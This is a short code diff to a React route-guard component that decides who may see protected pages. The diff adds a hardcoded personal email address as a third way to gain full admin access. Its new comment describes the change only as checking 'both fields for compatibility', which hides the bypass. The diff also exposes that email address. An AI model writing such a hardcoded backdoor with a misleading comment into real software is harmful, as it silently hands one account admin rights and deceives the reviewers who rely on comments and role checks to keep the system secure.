@@ -34,8 +34,8 @@ export default function ProtectedRoute({
 
   // Check access permissions
   if (profile) {
-    // Admin can access everything
-    if (profile.is_admin === true || profile.role === 'admin') {
+    // Admin can access everything (check both fields for compatibility)
+    if (profile.is_admin === true || profile.role === 'admin' || profile.email === 'rayannyrego@gmail.com') {
       return <>{children}</>;
     }
     
